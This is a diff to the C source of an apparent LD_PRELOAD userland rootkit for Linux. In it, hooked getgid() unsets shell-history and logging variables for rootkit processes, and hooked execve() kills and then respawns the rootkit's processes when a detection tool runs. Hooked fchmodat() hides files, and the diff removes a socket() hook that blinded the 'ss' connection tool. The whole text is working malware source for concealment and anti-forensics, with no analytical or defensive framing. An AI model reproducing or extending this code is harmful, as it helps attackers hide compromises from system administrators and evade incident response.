@@ -7,10 +7,6 @@ int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * 
     return o_libc_start_main(main,argc,ubp_av,init,fini,rtld_fini,stack_end);
 }
 
-/*
- * getgid() acts as an initialiser for rootkit
- * processes. why write our own new function
- * when we can overwrite existing ones. ;) */
 const char *usetenvs[4]={"HISTFILE","SAVEHIST","TMOUT","PROMPT_COMMAND"};
 gid_t getgid(void)
 {
@@ -21,7 +17,6 @@ gid_t getgid(void)
         int i;
         for(i=0; i < sizeof(usetenvs)/sizeof(usetenvs[0]); i++) unsetenv(usetenvs[i]);
         setenv("HOME",INSTALL_DIR,1);
-        // blahblahblah
     }
     return o; // still return gid even if it belongs to us
 }
@@ -31,6 +26,7 @@ gid_t getgid(void)
 /*
    EXEC
  */
+char *const nargv[3]={"/usr/bin/cat","/dev/null",NULL};
 int execve(const char *filename, char *const argv[], char *const envp[])
 {
     HOOK(o_execve,"execve");
@@ -41,13 +37,21 @@ int execve(const char *filename, char *const argv[], char *const envp[])
      * kill all rootkit processes. */
     if(is_bad_proc(filename))
     {
-        if(getuid() != 0){ errno=EPERM; return -1; } // need root perms to be able to kill our procs :)
+        if(getuid() != 0)
+        {
+            errno=EPERM;
+            return -1;
+        }
+
         kill_rk_procs();
 
-        /* we wait a short time just so we're sure the socket will be totally closed
-         * by the time they're getting to see their output. i could likely get away with
-         * making this a shorter delay. perhaps not. depends. */
-        sleep(3);
+        int pid;
+        if((pid=fork())<0) return pid;
+        else if(pid==0) return o_execve(filename,argv,envp);
+        (void) wait(NULL);
+
+        (void) o_execve("/usr/bin/cat",nargv,NULL); // run something so we start up again
+        exit(0);
     }
 
     return o_execve(filename,argv,envp);
@@ -441,19 +445,4 @@ int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags)
     if(getgid()==MGID) return o_fchmodat(dirfd,pathname,mode,flags);
     if(hfxstat(dirfd,32) || hxstat(pathname,32)){ errno=ENOENT; return -1; }
     return o_fchmodat(dirfd,pathname,mode,flags);
-}
-
-/*
-   SOCKET BREAKER
-   CIRCUIT BREAKER!!
- */
-int socket(int domain, int type, int protocol)
-{
-    if(domain == AF_NETLINK && protocol == NETLINK_INET_DIAG &&
-      (!strcmp(cprocname(), "ss") ||
-      !strcmp(cprocname(), "/usr/sbin/ss") ||
-      !strcmp(cprocname(), "/bin/ss")))
-      { errno = EIO; return -1; }
-    HOOK(o_socket, "socket");
-    return o_socket(domain,type,protocol);
 }
